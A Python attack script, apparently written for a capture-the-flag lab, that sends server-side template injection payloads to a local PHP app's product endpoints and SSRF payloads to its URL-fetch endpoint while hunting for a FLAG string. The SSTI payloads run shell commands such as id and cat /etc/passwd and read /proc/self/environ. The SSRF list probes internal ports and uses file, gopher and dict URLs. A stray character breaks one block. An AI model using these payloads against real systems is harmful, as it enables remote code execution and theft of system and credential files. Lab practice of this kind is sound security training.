import requests
import re
import time

print("SSTI & SSRF VULNERABILITY TEST")
print("=" * 60)

# Configuration
cookies = {"PHPSESSID": "05049af6efd6ed216b8a2e6938639807"}

# Test SSTI on article creation endpoint
def test_ssti():
    print("\n[1] Testing SSTI on /sku_add.php")
    print("-" * 60)
    
    ssti_payloads = [
        "{{7*7}}",
        "{{\"test\"}}",
        "{{\"test\"|upper}}",
        "{{config.items()}}",
        "{{_self.env}}",
        "{{_self.env.registerUndefinedFilterCallback(\"system\")}}",
        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}",
        "{{_self.env.registerUndefinedFilterCallback(\"shell_exec\")}}",
        "{{[\"id\"]|map(\"system\")|join}}",
        "{{[\"whoami\"]|map(\"system\")|join}}",
        "{{[\"cat /etc/passwd\"]|map(\"system\")|join}}",
        "{{[\"cat /flag.txt\"]|map(\"system\")|join}}",
        "{{[\"cat /flag\"]|map(\"system\")|join}}",
        "{{[\"find / -name flag*\"]|map(\"system\")|join}}",
        "{{[\"ls -la\"]|map(\"system\")|join}}",
        "{{[\"env\"]|map(\"system\")|join}}",
        "{{[\"cat /proc/self/environ\"]|map(\"system\")|join}}",
    ]
    
    for i, payload in enumerate(ssti_payloads, 1):
        print(f"[{i}] Testing SSTI payload: {payload}")
        
        data = {
            "sku": f"SSTI{i:03d}",
            "name": "SSTI Test",
            "description": payload
        }
        
        try:
            # Add article
            add_resp = requests.post("http://127.0.0.1:8081/sku_add.php", 
                                    data=data, cookies=cookies, timeout=5)
            
            # Check if SSTI executed
            if "49" in add_resp.text or "test" in add_resp.text.lower() or "root" in add_resp.text:
                print(f"[!] SSTI EXECUTED! Response contains: {add_resp.text[:200]}")
            
            # Now search for the article to see rendered output
            search_data = {"search": f"SSTI{i:03d}"}
            search_resp = requests.post("http://127.0.0.1:8081/sku_search.php",
                                       data=search_data, cookies=cookies, timeout=5)
            
            # Check if payload was rendered/executed
            rendered = False
            if payload not in search_resp.text and "SSTI Test" in search_resp.text:
                rendered = True
            
            if "49" in search_resp.text:
                print(f"[!] SSTI RENDERED: 7*7=49 executed!")
                rendered = True
            
            if "root:" in search_resp.text:
                print(f"[!] COMMAND EXECUTED: /etc/passwd content found!")
                rendered = True
            
            flags = re.findall(r'FLAG\{[^}]+\}', search_resp.text)
            if flags:
                print(f"[!] FLAG FOUND IN SSTI: {flags[0]}")
                return flags[0]
            
            if rendered:
                print(f"[+] Payload rendered - checking response...")
                preview = search_resp.text
                if len(preview) > 500:
                    print(f"Response preview: {preview[:500]}")
                else:
                    print(f"Full response: {preview}")
            
        except Exception as e:
            print(f"[!] Error: {str(e)}")
        
        print("-" * 40)
    
    return None

# Test SSRF
def test_ssrf():
    print("\n[2] Testing SSRF on /sku_url.php")
    print("-" * 60)
    
    ssrf_payloads = [
        "http://127.0.0.1:4455",  # Internal API exposed
        "http://localhost:4455",
        "http://127.0.0.1:8081",  # Self-reference
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "file:///etc/passwd",  # File access
        "file:///flag.txt",
        "file:///flag",
        "file:///proc/self/environ",
        "gopher://127.0.0.1:4455/_test",  # Gopher protocol
        "dict://127.0.0.1:4455/test",
    ]
    
    for i, payload in enumerate(ssrf_payloads, 1):
        print(f"[{i}] Testing SSRF payload: {payload}")
        
        data = {"url": payload}
        
        try:
            start = time.time()
            response = requests.post("http://127.0.0.1:8081/sku_url.php",
                                   data=data, cookies=cookies, timeout=10)
            elapsed = time.time() - start
            
            print(f"Status: {response.status_code} | Time: {elapsed:.2f}s | Size: {len(response.text)} bytes")
            
            # Check for interesting content
            if "root:" in response.text:
                print(f"[!] FILE READ SUCCESS: /etc/passwd content!")
            
            if "FLAG{" in response.text:
                flags = re.findall(r'FLAG\{[^}]+\}', response.text)
                print(f"[!] FLAG FOUND IN SSRF: {flags[0]}")
                return flags[0]
            
            # Show preview if different from normal
c                if len(response.text) > 100 and "Error" not in response.text:
                    preview = response.text[:300]
                    print(f"Content preview: {preview}")
            
        except requests.exceptions.Timeout:
            print(f"[!] Timeout - may indicate SSRF to internal service")
        except Exception as e:
            print(f"[!] Error: {str(e)}")
        
        print("-" * 40)
    
    return None

# Run tests
flag_found = None

# Test SSTI
flag = test_ssti()
if flag:
    flag_found = flag

# Test SSRF  
flag = test_ssrf()
if flag:
    flag_found = flag

# Final summary
print("\n" + "=" * 60)
print("TEST SUMMARY")
print("=" * 60)

if flag_found:
    print(f"[!] SUCCESS: FLAG FOUND: {flag_found}")
else:
    print("[-] No flags found with payloads")
    print("[+] Try more advanced techniques:")
    print("  - SSTI: Try different filter bypass techniques")
    print("  - SSRF: Try other protocols and internal endpoints")

print("\nTesting complete.")
